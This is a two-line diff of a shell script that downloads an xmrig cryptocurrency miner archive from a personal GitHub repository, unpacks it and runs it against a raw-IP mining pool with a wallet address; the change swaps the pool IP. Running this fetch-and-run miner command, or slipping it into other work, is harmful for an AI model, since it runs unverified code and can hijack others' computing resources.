@@ -1,2 +1,2 @@
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig -a ghostrider --url 139.162.36.122:443 --user SSuVek3r3mmQSLkincjW4K1HkBGCj6adEU.SUADIKHAP
+./xmrig -a ghostrider --url 172.104.169.94:443 --user SSuVek3r3mmQSLkincjW4K1HkBGCj6adEU.SUADIKHAP
